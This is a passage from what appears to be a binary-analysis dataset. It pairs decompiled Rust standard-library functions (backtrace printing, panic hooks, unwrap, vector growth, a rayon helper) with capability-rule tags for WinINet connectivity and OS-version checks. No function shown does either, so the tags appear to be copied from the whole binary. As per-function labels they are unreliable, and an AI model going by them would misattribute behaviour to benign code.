uStack1136;\n    int16_t aiStack616 [260];\n    int16_t aiStack96 [16];\n    \n    // std::sys_common::backtrace::_print_fmt::_$u7b$$u7b$closure$u7d$$u7d$::had12663f973ba5a2\n    pcStack1264 = *arg1;\n    if ((*pcStack1264 != '\\0') || (*arg1[1] < 0x65)) {\n        cStack1498 = '\\0';\n        cStack1497 = '\\0';\n        pcVar9 = arg1[2];\n        pcVar13 = arg1[3];\n        pcVar10 = arg1[4];\n        pcStack1272 = &cStack1498;\n        pcStack1248 = &cStack1497;\n        pcStack1280 = NULL;\n        if (*(arg2 + 8) != 0) {\n            pcStack1280 = *(arg2 + 8) + -1;\n        }\n        ppcStack1192 = &pcStack1272;\n        uStack1184 = 0x44ada8;\n        pcStack1256 = pcVar9;\n        pcStack1240 = pcVar13;\n        pcStack1232 = pcVar10;\n        iStack1224 = arg2;\n        if (CONCAT44(*0x452104, *0x452100) == 0) {\n            uStack1216 = sym.__rust_alloc(0x3c0, 8);\n            if (uStack1216 == 0) {\n                dbg.handle_alloc_error(0x3c0);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            uStack1208 = *0x444550;\n            uStack1204 = *0x444554;\n            uStack1200 = *0x444558;\n            uStack1196 = *0x44455c;\n            uStack1496 = 8;\n            _auStack1488 = ZEXT816(0);\n            iVar7 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(8, 0);\n            if (iVar7 != -1) {\n                ppcStack1312 = arg1;\n                pcStack1304 = pcVar9;\n                pcStack1296 = pcVar10;\n                pcStack1288 = pcVar13;\n                sub.msvcrt.dll_memset(auStack1176, 0);\n                auStack1176[0] = 0x438;\n                iVar6 = sub.KERNEL32.dll_Module32FirstW(iVar7, auStack1176);\n                if (iVar6 == 1) {\n                    iStack1464 = 8;\n                    iStack1456 = 0;\n                    uVar14 = *0x444560;\n                    uVar15 = *0x444564;\n                    uVar16 = *0x444568;\n                    uVar17 = *0x44456c;\n                    do {\n                        iVar11 = 0;\n                        do {\n                            if (aiStack616[iVar11] == 0) goto code_r0x00438bb0;\n                            if (aiStack616[iVar11 + 1] == 0) {\n                                iVar11 = iVar11 + 1;\n                                goto code_r0x00438bb0;\n                            }\n                            if (aiStack616[iVar11 + 2] == 0) {\n                                iVar11 = iVar11 + 2;\n                                goto code_r0x00438bb0;\n                            }\n                            if (aiStack616[iVar11 + 3] == 0) {\n                                iVar11 = iVar11 + 3;\n                                goto code_r0x00438bb0;\n                            }\n                            if (aiStack616[iVar11 + 4] == 0) {\n                                iVar11 = iVar11 + 4;\n                                goto code_r0x00438bb0;\n                            }\n                            iVar3 = iVar11 + 5;\n                            iVar11 = iVar11 + 5;\n                        } while (aiStack616 + iVar3 != aiStack96);\n                        iVar11 = 0x104;\ncode_r0x00438bb0:\n                        dbg.from_wide(&uStack1392, aiStack616, iVar11);\n                        piVar2 = piStack1376;\n                        iVar11 = CONCAT44(uStack1388, uStack1392);\n                        dbg.mmap(&uStack1448);\n                        piVar4 = uStack1432;\n                        if (uStack1448 == 0) {\ncode_r0x00438c85:\n                            if (CONCAT44(uStack1380, uStack1384) != 0) {\n                                sym.__rust_dealloc(iVar11, 1);\n                            }\n                        }\n                        else {\n                            piStack1352 = uStack1424;\n                            uStack1368 = uStack1440;\n                            uStack1364 = uStack1440._4_4_;\n                            uStack1360 = uStack1432;\n                            uStack1356 = uStack1432._4_4_;\n                            if (((uStack1424 < 0x40) || (uStack1432 == NULL)) || (*uStack1432 != 0x5a4d)) {\ncode_r0x00438c70:\n                                sub.KERNEL32.dll_UnmapViewOfFile(uStack1432);\n                                sub.KERNEL32.dll_CloseHandle(CONCAT44(uStack1364, uStack1368));\n                                goto code_r0x00438c85;\n                            }\n                            piVar8 = *(uStack1432 + 0x1e);\n                            if (((((uStack1424 < piVar8) || (uStack1424 - piVar8 < 0x88)) ||\n                                 ((*(uStack1432 + piVar8) != 0x4550 ||\n                                  ((*(uStack1432 + 0xc + piVar8) != 0x20b ||\n                                   (uVar12 = *(uStack1432 + 10 + piVar8) - 0x70,  *(uStack1432 + 10 + piVar8) < 0x70))))\n                                 )) || (uStack1424 < piVar8 + 0x11)) ||\n                               ((uStack1424 - (piVar8 + 0x11) < uVar12 || (uVar12 < *(uStack1432 + 0x42 + piVar8) << 3))\n                               )) goto code_r0x00438c70;\n                            iStack1472 = *(uStack1432 + 0x18 + piVar8);\n                            iStack1320 = CONCAT44(uStack1148, uStack1152);\n                            uStack1432 = piStack1376;\n                            piVar8 = sym.__rust_alloc(0x10, 8);\n                            if (piVar8 == NULL) {\n                                dbg.handle_alloc_error(0x10);\n                                do {\n                                    invalidInstructionException();\n                                } while( true );\n                            }\n                            *piVar8 = iStack1472;\n                            piVar8[1] = uStack1144;\n                            uStack1336 = CONCAT44(uStack1380, uStack1384);\n                            piStack1328 = piVar8;\n                            sub.KERNEL32.dll_UnmapViewOfFile(piVar4);\n                            sub.KERNEL32.dll_CloseHandle(CONCAT44(uStack1364, uStack1368));\n                            iStack1400 = iStack1320 - iStack1472;\n                            uStack1440 = uStack1336;\n                            uStack1432 = piVar2;\n                            uStack1424 = piStack1328;\n                            _auStack1416 = CONCAT412(uVar17, CONCAT48(uVar16, CONCAT44(uVar15, uVar14)));\n                            iStack1480 = iStack1456;\n                            uStack1448 = iVar11;\n                            if (iStack1456 == auStack1488) {\n                                dbg.reserve_for_push<std::backtrace_rs::symbolize::gimli::Library, alloc::alloc::Global>\n                                          (&uStack1496, iStack1456);\n                                iStack1464 = uStack1496;\n                            }\n                            iVar11 = iStack1480 * 0x38;\n                            *(iStack1464 + 0x30 + iVar11) = iStack1400;\n                            puVar1 = iStack1464 + 0x20 + iVar11;\n                            *puVar1 = auStack1416._0_4_;\n                            puVar1[1] = auStack1416._4_4_;\n                            puVar1[2] = uStack1408;\n                            puVar1[3] = uStack1404;\n                            puVar1 = iStack1464 + 0x10 + iVar11;\n                            *puVar1 = uStack1432;\n                            puVar1[1] = uStack1432._4_4_;\n                            puVar1[2] = uStack1424;\n                            puVar1[3] = uStack1424._4_4_;\n                            puVar1 = iStack1464 + iVar11;\n                            *puVar1 = uStack1448;\n                            puVar1[1] = uStack1448._4_4_;\n                            puVar1[2] = uStack1440;\n                            puVar1[3] = uStack1440._4_4_;\n                            iStack1456 = iStack1480 + 1;\n                            _auStack1488 = CONCAT88(iStack1456, auStack1488);\n                        }\n                        iVar6 = sub.KERNEL32.dll_Module32NextW(iVar7, auStack1176);\n                    } while (iVar6 == 1);\n                }\n                sub.KERNEL32.dll_CloseHandle(iVar7);\n                pcVar9 = pcStack1304;\n                arg1 = ppcStack1312;\n                pcVar10 = pcStack1296;\n                pcVar13 = pcStack1288;\n            }\n            uStack1160 = iStack1480;\n            uStack1152 = uStack1216;\n            uStack1148 = uStack1216._4_4_;\n            uStack1144 = uStack1208;\n            uStack1140 = uStack1204;\n            uStack1136 = CONCAT44(uStack1196, uStack1200);\n            *0x452100 = uStack1496;\n            *0x452104 = uStack1496._4_4_;\n            *0x452108 = auStack1488._0_4_;\n            *0x45210c = auStack1488._4_4_;\n            uStack1160._0_4_ = SUB164(_auStack1488 >> 0x40, 0);\n            uStack1160._4_4_ = SUB164(_auStack1488 >> 0x60, 0);\n            *0x452110 = uStack1160;\n            *0x452114 = uStack1160._4_4_;\n            *0x452118 = uStack1216;\n            *0x45211c = uStack1216._4_4_;\n            *0x452120 = uStack1208;\n            *0x452124 = uStack1204;\n            *0x452128 = uStack1200;\n            *0x45212c = uStack1196;\n        }\n        arg1_00 = &pcStack1280;\n        dbg.{closure#1}(arg1_00, &ppcStack1192);\n        if (cStack1497 == '\\0') {\n            if ((cStack1498 == '\\0') && (*pcVar9 != '\\0')) {\n                pcStack1264 = NULL;\n                uStack1160 = 4;\n                uStack1448 = 2;\n                arg1_00 = &pcStack1272;\n                pcStack1272 = pcVar10;\n                cVar5 = dbg.print_raw_with_column(arg1_00, *(arg2 + 8), auStack1176, &uStack1448);\n                *pcVar13 = cVar5;\n                *(pcStack1272 + 8) = *(pcStack1272 + 8) + 1;\n            }\n            *arg1[1] = *arg1[1] + 1;\n            uVar12 = arg1_00 & 0xffffffffffffff00 | *pcVar13 == '\\0';\n            goto code_r0x00438efa;\n        }\n    }\n    uVar12 = 0;\ncode_r0x00438efa:\n    return uVar12 & 0xffffffff;\n}\n",
        "token_count": 3325
    },
    "04a31a5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.std::sys_common::backtrace::_print_fmt::__u7b__u7b_closure_u7d__u7d_::__u7b__u7b_closure_u7d__u7d_::h04a31a5cc6937839\n               (ulong *arg1, int64_t *arg2)\n\n{\n    char *pcVar1;\n    ulong arg2_00;\n    char cVar2;\n    uchar uVar3;\n    int64_t iStack160;\n    int64_t iStack152;\n    int64_t iStack144;\n    int64_t iStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    int64_t iStack104;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    // std::sys_common::backtrace::_print_fmt::_$u7b$$u7b$closure$u7d$$u7d$::_$u7b$$u7b$closure$u7d$$u7d$::h04a31a5cc6937839\n    **arg1 = 1;\n    if (((*arg1[1] == '\\0') && (dbg.name(&uStack120, arg2),  iStack104 != 4)) &&\n       ((iStack104 != 3 ||\n        ((dbg.from_utf8(&iStack160, uStack120, uStack112),  iStack160 == 0 &&\n         (iStack72 = iStack152,  iStack64 = iStack144,  iStack152 != 0)))))) {\n        pcVar1 = arg1[2];\n        if ((*pcVar1 != '\\0') &&\n           (cVar2 = dbg.contains<&str>(iStack72, iStack64, \n                                       \"__rust_begin_short_backtrace__rust_end_short_backtrace<unknown>\", 0x1c), \n           cVar2 != '\\0')) {\n            *arg1[3] = 1;\n            return;\n        }\n        cVar2 = dbg.contains<&str>(iStack72, iStack64, \"__rust_end_short_backtrace<unknown>\", 0x1a);\n        if (cVar2 != '\\0') {\n            *pcVar1 = '\\x01';\n            return;\n        }\n    }\n    if (*arg1[2] != '\\0') {\n        iStack136 = arg1[5];\n        uStack128 = 0;\n        arg2_00 = *(arg1[6] + 8);\n        dbg.name(&uStack120, arg2);\n        if (*arg2 == 0) {\n            if (*(arg2 + 4) == 2) {\n                iStack160 = 2;\n            }\n            else if (arg2[2] == 0) {\n                iStack160 = 2;\n            }\n            else {\n                iStack144 = arg2[3];\n                iStack160 = 0;\n                iStack152 = arg2[2];\n            }\n        }\n        else {\n            iStack160 = 2;\n        }\n        uVar3 = dbg.print_raw_with_column(&iStack136, arg2_00, &uStack120, &iStack160);\n        *arg1[4] = uVar3;\n        *(iStack136 + 8) = *(iStack136 + 8) + 1;\n    }\n    return;\n}\n",
        "token_count": 730
    },
    "5c0e18d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.std::panicking::default_hook::__u7b__u7b_closure_u7d__u7d_::h5c0e18d7fc45dc64\n               (ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int64_t iVar4;\n    uchar uStack137;\n    ulong uStack136;\n    code *pcStack128;\n    ulong uStack120;\n    code *pcStack112;\n    char *pcStack104;\n    code *pcStack96;\n    ulong uStack88;\n    uchar *puStack80;\n    code *pcStack72;\n    ulong uStack64;\n    ulong *puStack48;\n    ulong uStack40;\n    \n    // std::panicking::default_hook::_$u7b$$u7b$closure$u7d$$u7d$::h5c0e18d7fc45dc64\n    uStack136 = *arg1;\n    uStack120 = arg1[1];\n    pcStack104 = arg1[2];\n    pcStack128 = sym._T_as_core::fmt::Display_::fmt::h4328717df0c3b322;\n    pcStack112 = sym._T_as_core::fmt::Display_::fmt::h4328717df0c3b322;\n    pcStack96 = dbg.fmt<core::panic::location::Location>;\n    puStack80 = 0x44ab80;\n    pcStack72 = 0x4;\n    uStack64 = 0;\n    puStack48 = &uStack136;\n    uStack40 = 3;\n    pcVar2 = *(arg3 + 0x48);\n    iVar4 = (*pcVar2)(arg2, &puStack80);\n    if (iVar4 != 0) {\n        dbg.drop_in_place<std::io::error::Error>(iVar4);\n    }\n    cVar3 = *0x443060;\n    cVar1 = *arg1[3];\n    if (cVar1 != '\\x03') {\n        if (cVar1 == '\\x02') {\n            *0x443060 = '\\0';\n            if (cVar3 == '\\0') {\n                *0x443060 = 0;\n                return;\n            }\n            uStack136 = 0x44ac10;\n            pcStack128 = 0x1;\n            uStack120 = 0;\n            pcStack104 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            pcStack96 = NULL;\n            iVar4 = (*pcVar2)(arg2, &uStack136);\n        }\n        else {\n            if (cVar1 == '\\x01') {\n                sub.KERNEL32.dll_AcquireSRWLockExclusive(0x4520b0);\n                uStack88 = 0x4520b0;\n                uStack137 = 1;\n                puStack80 = &uStack137;\n                pcStack72 = \n                sym._std::sys_common::backtrace::_print::DisplayBacktrace_as_core::fmt::Display_::fmt::hf4f2cece63ea17af\n                ;\n                uStack136 = 0x449f88;\n                pcStack128 = 0x1;\n                uStack120 = 0;\n                pcStack96 = 0x1;\n                pcStack104 = &puStack80;\n                iVar4 = (*pcVar2)(arg2, &uStack136);\n            }\n            else {\n                sub.KERNEL32.dll_AcquireSRWLockExclusive(0x4520b0);\n                uStack88 = 0x4520b0;\n                uStack137 = 0;\n                puStack80 = &uStack137;\n                pcStack72 = \n                sym._std::sys_common::backtrace::_print::DisplayBacktrace_as_core::fmt::Display_::fmt::hf4f2cece63ea17af\n                ;\n                uStack136 = 0x449f88;\n                pcStack128 = 0x1;\n                uStack120 = 0;\n                pcStack96 = 0x1;\n                pcStack104 = &puStack80;\n                iVar4 = (*pcVar2)(arg2, &uStack136);\n            }\n            sub.KERNEL32.dll_ReleaseSRWLockExclusive(0x4520b0);\n        }\n        if (iVar4 != 0) {\n            dbg.drop_in_place<std::io::error::Error>(iVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 1031
    },
    "65f8246d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.std::panicking::begin_panic_handler::__u7b__u7b_closure_u7d__u7d_::h65f8246da8a27a59\n               (int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t *piStack40;\n    int64_t *piStack32;\n    \n    // std::panicking::begin_panic_handler::_$u7b$$u7b$closure$u7d$$u7d$::h65f8246da8a27a59\n    if (arg1[1] == 1) {\n        if (arg1[5] != 0) goto code_r0x0043a102;\n        piStack40 = **arg1;\n        piStack32 = (*arg1)[1];\n    }\n    else {\n        if ((arg1[1] != 0) || (arg1[5] != 0)) {\ncode_r0x0043a102:\n            piStack32 = NULL;\n            piStack40 = arg1;\n            dbg.rust_panic_with_hook(&piStack40, 0x44ac78, *(arg2 + 0x10), arg3);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piStack40 = 0x44bbe8;\n        piStack32 = NULL;\n    }\n    dbg.rust_panic_with_hook(&piStack40, 0x44aca0, *(arg2 + 0x10), arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 349
    },
    "d2c26aa9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym._std::panicking::begin_panic_handler::PanicPayload_as_core::panic::BoxMeUp_::take_box::hd2c26aa91bf57167\n               (int64_t *arg1)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    ulong uStack104;\n    uchar auStack96 [8];\n    int64_t iStack88;\n    ulong *puStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int64_t iStack56;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    // <std::panicking::begin_panic_handler::PanicPayload as core::panic::BoxMeUp>::take_box::hd2c26aa91bf57167\n    if (arg1[1] == 0) {\n        puVar2 = *arg1;\n        _auStack96 = ZEXT816(0);\n        uStack104 = 1;\n        puStack80 = &uStack104;\n        uStack72 = *puVar2;\n        uStack68 = puVar2[1];\n        uStack64 = puVar2[2];\n        uStack60 = puVar2[3];\n        iStack56 = *(puVar2 + 4);\n        uStack48 = puVar2[6];\n        uStack44 = puVar2[7];\n        uStack40 = puVar2[8];\n        uStack36 = puVar2[9];\n        uStack32 = puVar2[10];\n        uStack28 = puVar2[0xb];\n        dbg.write(&puStack80, 0x449430, &uStack72);\n        arg1[3] = iStack88;\n        *(arg1 + 1) = uStack104;\n        *(arg1 + 0xc) = uStack104._4_4_;\n        *(arg1 + 2) = auStack96._0_4_;\n        *(arg1 + 0x14) = auStack96._4_4_;\n    }\n    iStack56 = arg1[3];\n    uStack72 = *(arg1 + 1);\n    uStack68 = *(arg1 + 0xc);\n    iVar1 = **(arg1 + 2);\n    _auStack96 = *(arg1 + 2);\n    arg1[1] = 1;\n    *(arg1 + 2) = ZEXT816(0);\n    auStack96._0_4_ = iVar1;\n    auStack96._4_4_ = iVar1 >> 0x20;\n    uStack64 = auStack96._0_4_;\n    uStack60 = auStack96._4_4_;\n    uStack104._0_4_ = uStack72;\n    uStack104._4_4_ = uStack68;\n    puVar2 = sym.__rust_alloc(0x18, 8);\n    if (puVar2 != NULL) {\n        *(puVar2 + 4) = iStack88;\n        *puVar2 = uStack104;\n        puVar2[1] = uStack104._4_4_;\n        puVar2[2] = auStack96._0_4_;\n        puVar2[3] = auStack96._4_4_;\n        return;\n    }\n    dbg.handle_alloc_error(0x18);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 783
    },
    "69a954bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * sym._std::panicking::begin_panic_handler::PanicPayload_as_core::panic::BoxMeUp_::get::h69a954bbd1d2b636\n                    (int64_t *arg1)\n\n{\n    uint *puVar1;\n    ulong uStack88;\n    uchar auStack80 [8];\n    int64_t iStack72;\n    ulong *puStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // <std::panicking::begin_panic_handler::PanicPayload as core::panic::BoxMeUp>::get::h69a954bbd1d2b636\n    if (arg1[1] == 0) {\n        puVar1 = *arg1;\n        _auStack80 = ZEXT816(0);\n        uStack88 = 1;\n        puStack64 = &uStack88;\n        uStack56 = *puVar1;\n        uStack52 = puVar1[1];\n        uStack48 = puVar1[2];\n        uStack44 = puVar1[3];\n        uStack40 = puVar1[4];\n        uStack36 = puVar1[5];\n        uStack32 = puVar1[6];\n        uStack28 = puVar1[7];\n        uStack24 = puVar1[8];\n        uStack20 = puVar1[9];\n        uStack16 = puVar1[10];\n        uStack12 = puVar1[0xb];\n        dbg.write(&puStack64, 0x449430, &uStack56);\n        arg1[3] = iStack72;\n        *(arg1 + 1) = uStack88;\n        *(arg1 + 0xc) = uStack88._4_4_;\n        *(arg1 + 2) = auStack80._0_4_;\n        *(arg1 + 0x14) = auStack80._4_4_;\n    }\n    return arg1 + 1;\n}\n",
        "token_count": 504
    },
    "b8b4e66a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::hb8b4e66ae7491bb0\n                   (uint64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::grow_amortized::hb8b4e66ae7491bb0\n    uVar2 = arg2 + arg3;\n    if (!CARRY8(arg2, arg3)) {\n        uVar1 = arg1[1];\n        if (uVar2 < uVar1 * 2) {\n            uVar2 = uVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (uVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = uVar1 * 0x110;\n            uStack48 = *arg1;\n            uStack32 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(0x110), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x110) >> 0x40, 0) == 0) << 3, &uStack48);\n        uVar2 = uStack64;\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 439
    },
    "96260775": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::option::Option_T_::unwrap::h9626077523606ac7(uint *arg1, int64_t *arg2, ulong arg3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    \n    // core::option::Option<T>::unwrap::h9626077523606ac7\n    if (*arg2 != 0) {\n        uVar1 = *arg2;\n        uVar2 = *(arg2 + 4);\n        uVar3 = *(arg2 + 1);\n        uVar4 = *(arg2 + 0xc);\n        uVar5 = *(arg2 + 2);\n        uVar6 = *(arg2 + 0x14);\n        uVar7 = *(arg2 + 3);\n        uVar8 = *(arg2 + 0x1c);\n        uVar9 = *(arg2 + 0x24);\n        uVar10 = *(arg2 + 5);\n        uVar11 = *(arg2 + 0x2c);\n        arg1[8] = *(arg2 + 4);\n        arg1[9] = uVar9;\n        arg1[10] = uVar10;\n        arg1[0xb] = uVar11;\n        arg1[4] = uVar5;\n        arg1[5] = uVar6;\n        arg1[6] = uVar7;\n        arg1[7] = uVar8;\n        *arg1 = uVar1;\n        arg1[1] = uVar2;\n        arg1[2] = uVar3;\n        arg1[3] = uVar4;\n        return;\n    }\n    dbg.panic(0x44bcbb, 0x2b, arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 449
    },
    "d38c8e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.rayon::iter::plumbing::bridge_producer_consumer::helper::hd38c8e70ff773f4b(ulong arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int64_t **ppiVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uchar (**ppauVar7) [16];\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    char cVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uchar (*pauVar16) [16];\n    int64_t *piVar17;\n    int64_t iVar18;\n    char *arg1_00;\n    uchar *in_RDX;\n    int64_t *piVar19;\n    ulong uVar20;\n    uint64_t uVar21;\n    ulong *puVar22;\n    int64_t iVar23;\n    ulong *puVar24;\n    ulong uVar25;\n    ulong in_R9;\n    uint in_XMM6_Da;\n    uint uVar26;\n    uint uVar27;\n    uint in_XMM6_Db;\n    uint uVar28;\n    uint uVar29;\n    uint in_XMM6_Dc;\n    uint uVar30;\n    uint uVar31;\n    uint in_XMM6_Dd;\n    uint uVar32;\n    uint uVar33;\n    ulong var_8h;\n    ulong uStack72;\n    \n    // rayon::iter::plumbing::bridge_producer_consumer::helper::hd38c8e70ff773f4b\n    uStack72 = 0x43b402;\n    iVar12 = dbg.___chkstk_ms(arg1);\n    iVar12 = -iVar12;\n    *(&stack0x00001040 + iVar12) = CONCAT412(in_XMM6_Dd, CONCAT48(in_XMM6_Dc, CONCAT44(in_XMM6_Db, in_XMM6_Da)));\n    *(&stack0x00000048 + iVar12) = arg1;\n    ppiVar3 = *(&stack0x000010d8 + iVar12);\n    uVar4 = *(&stack0x000010d0 + iVar12);\n    piVar19 = *(&stack0x000010c8 + iVar12);\n    *(&stack0x00000150 + iVar12) = in_RDX;\n    puVar22 = &stack0x00000758 + iVar12;\n    *puVar22 = in_R9;\n    *(&stack0x00000760 + iVar12) = *(&stack0x000010c0 + iVar12);\n    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b457;\n    puVar14 = in_RDX;\n    cVar11 = sym.rayon::iter::plumbing::LengthSplitter::try_split::hce2093dd0020a5d0(puVar22, in_RDX);\n    if (cVar11 == '\\0') {\n        uVar26 = 0;\n        uVar28 = 0;\n        uVar30 = 0;\n        uVar32 = 0;\n        *(&stack0x00000160 + iVar12) = ZEXT816(0);\n        *(&stack0x000001b8 + iVar12) = piVar19 + uVar4;\n        *(&stack0x00000058 + iVar12) = 8;\n        do {\n            while( true ) {\n                if (piVar19 == *(&stack0x000001b8 + iVar12)) {\n                    *(&stack0x00000740 + iVar12) = *(&stack0x00000160 + iVar12);\n                    *(&stack0x00000744 + iVar12) = *(&stack0x00000164 + iVar12);\n                    *(&stack0x00000748 + iVar12) = *(&stack0x00000168 + iVar12);\n                    *(&stack0x0000074c + iVar12) = *(&stack0x0000016c + iVar12);\n                    *(&stack0x00000330 + iVar12) = *(&stack0x00000058 + iVar12);\n                    *(&stack0x00000338 + iVar12) = *(&stack0x00000160 + iVar12);\n                    *(&stack0x0000033c + iVar12) = *(&stack0x00000164 + iVar12);\n                    *(&stack0x00000340 + iVar12) = *(&stack0x00000168 + iVar12);\n                    *(&stack0x00000344 + iVar12) = *(&stack0x0000016c + iVar12);\n                    if (*(&stack0x00000340 + iVar12) != 0) {\n                        *(&stack0x00000830 + iVar12) = *(&stack0x00000340 + iVar12);\n                        *(&stack0x00000820 + iVar12) = *(&stack0x00000330 + iVar12);\n                        *(&stack0x00000828 + iVar12) = *(&stack0x00000338 + iVar12);\n                        uVar27 = 0;\n                        uVar29 = 0;\n                        uVar31 = 0;\n                        uVar33 = 0;\n                        *(&stack0x00000810 + iVar12) = ZEXT816(0);\n                        *(&stack0xffffffffffffffb8 + iVar12) = 0x43c862;\n                        pauVar16 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.349(0x28, 8);\n                        uVar26 = *(&stack0x00000814 + iVar12);\n                        uVar28 = *(&stack0x00000818 + iVar12);\n                        uVar30 = *(&stack0x0000081c + iVar12);\n                        uVar32 = *(&stack0x00000820 + iVar12);\n                        uVar8 = *(&stack0x00000824 + iVar12);\n                        uVar9 = *(&stack0x00000828 + iVar12);\n                        uVar10 = *(&stack0x0000082c + iVar12);\n                        **pauVar16 = *(&stack0x00000810 + iVar12);\n                        *(*pauVar16 + 4) = uVar26;\n                        *(*pauVar16 + 8) = uVar28;\n                        *(*pauVar16 + 0xc) = uVar30;\n                        *pauVar16[1] = uVar32;\n                        *(pauVar16[1] + 4) = uVar8;\n                        *(pauVar16[1] + 8) = uVar9;\n                        *(pauVar16[1] + 0xc) = uVar10;\n                        *pauVar16[2] = *(&stack0x00000830 + iVar12);\n                        *pauVar16 = CONCAT412(uVar33, CONCAT48(uVar31, CONCAT44(uVar29, uVar27)));\n                        ppauVar7 = *(&stack0x00000048 + iVar12);\n                        *ppauVar7 = pauVar16;\n                        ppauVar7[1] = pauVar16;\n                        ppauVar7[2] = 0x1;\n                        return;\n                    }\n                    pauVar16 = *(&stack0x00000048 + iVar12);\n                    *pauVar16 = ZEXT816(0);\n                    *pauVar16[1] = 0;\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43ca62;\n                    sym.core::ptr::drop_in_place_alloc::vec::Vec_sysinfo::windows::process::Process__::hc2f3588007d941dd\n                              (&stack0x00000330 + iVar12);\n                    return;\n                }\n                iVar13 = *piVar19;\n                piVar19 = piVar19 + 1;\n                *(&stack0x000001e0 + iVar12) = *(&stack0x00000160 + iVar12);\n                *(&stack0x000001e4 + iVar12) = *(&stack0x00000164 + iVar12);\n                *(&stack0x000001e8 + iVar12) = *(&stack0x00000168 + iVar12);\n                *(&stack0x000001ec + iVar12) = *(&stack0x0000016c + iVar12);\n                uVar1 = *(iVar13 